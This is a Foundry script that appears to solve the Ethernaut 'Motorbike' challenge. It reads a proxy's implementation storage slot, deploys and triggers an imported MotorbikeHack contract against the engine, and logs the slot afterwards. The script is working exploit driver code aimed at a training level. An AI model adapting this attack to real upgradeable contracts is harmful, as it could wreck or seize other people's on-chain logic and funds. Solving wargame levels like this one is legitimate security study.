// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {MotorbikeHack} from "ethernaut/motorbike_hack.sol";

contract MotorbikeHackScript is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        address target = address(0x3535FcbFc191559552AF470f8b2992EAc53347ED);
        address engine = address(uint160(uint256(vm.load(target, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))));
        MotorbikeHack motorbikeHack = new MotorbikeHack(engine);
        motorbikeHack.hack();
        address newEngine1 = address(uint160(uint256(vm.load(engine, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))));
        console.log("New Engine in Engine: ", newEngine1);
        address newEngine2 = address(uint160(uint256(vm.load(target, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc))));
        console.log("New Engine in Proxy: ", newEngine2);

        vm.stopBroadcast();
    }
}
